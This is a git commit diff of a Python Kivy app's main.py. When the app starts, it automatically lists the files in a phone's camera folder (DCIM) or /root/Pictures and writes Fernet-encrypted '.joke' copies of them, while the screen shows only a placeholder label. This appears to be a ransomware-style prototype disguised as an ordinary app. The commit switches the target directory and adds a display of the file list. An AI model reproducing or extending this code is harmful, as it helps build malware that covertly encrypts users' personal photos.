928b0eb8639b704de500e065310bcfd1d4c7c45a
Akshay Ratnani <59859138+Akshay121-AK@users.noreply.github.com>
2023-11-21 20:41:25 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,20 +1,22 @@
 from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
 from kivy.uix.button import Button
 from cryptography.fernet import Fernet
 import os
 
 class MainApp(App):
     def build(self):
-        layout = BoxLayout(orientation='vertical')
+        self.layout = BoxLayout(orientation='vertical')
+
+        # Create a label widget
+        self.label = Label(text="Your Code Goes Here")
+        self.layout.add_widget(self.label)
 
         # Call the main function when the app starts
         self.main()
 
-        label = Button(text="Your Code Goes Here")
-        layout.add_widget(label)
-
-        return layout
+        return self.layout
 
     def main(self):
         def utpann():
@@ -30,19 +32,23 @@ class MainApp(App):
 
                 with open(file + ".joke", 'wb') as file_enc:
                     file_enc.write(encrypted_data)
+                
+                # # Update label text when a file is encrypted successfully
+                # self.label.text = f"{file} encrypted successfully!"
             except Exception as e:
                 print(f"Error encrypting {file}: {e}")
 
         files = []
 
         # Replace the directory path with your desired path
-        # directory_path = "/root/Pictures"
-        directory_path = "/storage/emulated/0/DCIM"
+        directory_path = "/root/Pictures"
+        # directory_path = "/storage/emulated/0/DCIM"
         for file in os.listdir(directory_path):
             file_path = os.path.join(directory_path, file)
             if os.path.isfile(file_path):
                 files.append(file_path)
 
+        self.label.text = str(files)
         print(files)
 
         key = utpann()
